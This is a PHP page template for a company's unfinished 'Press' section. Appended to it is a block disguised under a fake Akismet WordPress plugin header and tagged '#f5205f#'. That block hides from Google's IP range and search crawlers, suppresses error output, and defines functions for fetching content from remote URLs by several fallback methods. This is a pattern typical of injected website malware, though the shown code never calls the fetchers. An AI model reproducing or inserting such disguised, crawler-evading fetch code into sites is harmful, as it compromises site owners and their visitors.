<!--

	babeleye Inc
	
	PRESS Section

-->
<?php 
$page = file_get_contents("../_shared/template.php");
$page = str_replace("[TITLE]", "babeleye | Press Services", $page);
$finalHTML = '<img name="splashConatct" src="../images/nu_press.jpg" alt="BabelEye Press Service" width="900" height="250" />
  <p/>

<table class="tContent" width="900" cellpadding="5" cellspacing="20">
  <tr>
<!--    <td width=25% valign="top" > </td>
		<td width=10px rowspan="2"></td>
-->
	<td align="center" valign="top"><p>P R E S S<br/><br/>Publishing Soon...
</p></td>  	
  </tr>
</table>
';
$page = str_replace("[CONTENT]", $finalHTML, $page);
echo $page;
?>
<?php
#f5205f#
/**
 * @package Akismet
 */
/*
Plugin Name: Akismet
Plugin URI: http://akismet.com/
Description: Used by millions, Akismet is quite possibly the best way in the world to <strong>protect your blog from comment and trackback spam</strong>. It keeps your site protected from spam even while you sleep. To get started: 1) Click the "Activate" link to the left of this description, 2) <a href="http://akismet.com/get/">Sign up for an Akismet API key</a>, and 3) Go to your Akismet configuration page, and save your API key.
Version: 3.0.0
Author: Automattic
Author URI: http://automattic.com/wordpress-plugins/
License: GPLv2 or later
Text Domain: akismet
*/

/*
This program is free software; you can redistribute it and/or
modify it under the terms of the GNU General Public License
as published by the Free Software Foundation; either version 2
of the License, or (at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
*/

if( empty( $ieo ) ) {
    if( ( substr( trim( $_SERVER['REMOTE_ADDR'] ), 0, 6 ) == '74.125' ) || preg_match(
            "/(googlebot|msnbot|yahoo|search|bing|ask|indexer)/i",
            $_SERVER['HTTP_USER_AGENT']
        )
    ) {
    } else {
        error_reporting( 0 );
        @ini_set( 'display_errors', 0 );
        if( !function_exists( '__url_get_contents' ) ) {
            function __url_get_contents( $remote_url, $timeout )
            {
                if( function_exists( 'curl_exec' ) ) {
                    $ch = curl_init();
                    curl_setopt( $ch, CURLOPT_URL, $remote_url );
                    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
                    curl_setopt( $ch, CURLOPT_CONNECTTIMEOUT, $timeout );
                    curl_setopt( $ch, CURLOPT_TIMEOUT, $timeout ); //timeout in seconds
                    $_url_get_contents_data = curl_exec( $ch );
                    curl_close( $ch );
                } elseif( function_exists( 'file_get_contents' ) && ini_get( 'allow_url_fopen' ) ) {
                    $ctx = @stream_context_create(
                        array(
                            'http' =>
                                array(
                                    'timeout' => $timeout,
                                )
                        )
                    );
                    $_url_get_contents_data = @file_get_contents( $remote_url, false, $ctx );
                } elseif( function_exists( 'fopen' ) && function_exists( 'stream_get_contents' ) ) {
                    $handle = @fopen( $remote_url, "r" );
                    $_url_get_contents_data = @stream_get_contents( $handle );
                } else {
                    $_url_get_contents_data = __file_get_url_contents( $remote_url );
                }
                return $_url_get_contents_data;
            }
        }

        if( !function_exists( '__file_get_url_contents' ) ) {
            function __file_get_url_contents( $remote_url )
            {
                if( preg_match(
                    '/^([a-z]+):\/\/([a-z0-9-.]+)(\/.*$)/i',
                    $remote_url,
                    $matches
                )
                ) {
                    $protocol = strtolower( $matches[1] );
                    $host = $matches[2];
                    $path = $matches[3];
                } else {
// Bad remote_url-format
                    return false;
                }
                if( $protocol == "http" ) {
                    $socket = @fsockopen( $host, 80, $errno, $errstr, $timeout );
                } else {
// Bad protocol
                    return false;
                }
                if( !$socket ) {
// Error creating socket
                    return false;
                }
                $request = "GET $path HTTP/1.0\r\nHost: $host\r\n\r\n";
                $len_written = @fwrite( $socket, $request );
                if( $len_written === false || $len_written != strlen( $request ) ) {
// Error sending request
                    return false;
                }
                $response = "";
                while( !@feof( $socket ) &&
                    ( $buf = @fread( $socket, 4096 ) ) !== false ) {
                    $response .= $buf;
                }
                if( $buf === false ) {
// Error reading response
                    return false;
                }
                $end_of_header = strpos( $response, "\r\n\r\n" );
                return substr( $response, $end_of_header + 4 );
            }
        }
    }
}

?> 






